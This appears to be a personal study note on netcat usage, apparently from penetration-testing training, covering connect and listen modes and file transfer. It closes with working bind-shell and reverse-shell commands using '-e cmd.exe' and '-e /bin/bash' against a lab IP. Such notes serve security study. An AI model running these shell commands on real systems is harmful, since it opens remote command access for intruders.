> Protocols: TCP or UDP
> Platforms: Windows or Linux
### Client mode
- connect to a port
- e.g. `nc -n -v 10.11.0.22 110`
	- `-n`: skip DNS name resolution
	- `-v`: verbose output
	- `10.11.0.22 110`: destination ip address and port number
	- ![[Pasted image 20231223210900.png]]
		- 1st line: nc output (tells us port is open)
		- 2nd line: response from server
### Server mode
- listen to a port
- e.g. `nc -nvlp 4444`
	- `-l`: listener
	- `-p`: to specify listening port number

### File Transfer
- `nc -nvlp 4444 > incomingfile
- `nc -nv 10.11.0.22 110 < outgoingfile

### Remote Administration
#### command redirection
- `-e`: redirect the input, output and error messages of an executable to a port
	- e.g. if we bind cmd.exe to a port, anyone connecting to the port will be able to run commands on the target machine
- e.g. `nc -nvlp 4444 -e cmd.exe`
#### Reverse Shell
- send a command shell to a host listening on a specific port (meaning target machine is the client)
- e.g. 
  on target machine: `nc -nv 10.11.0.22 4444 -e /bin/bash`
  on remote machine: `nc -nvlp 4444`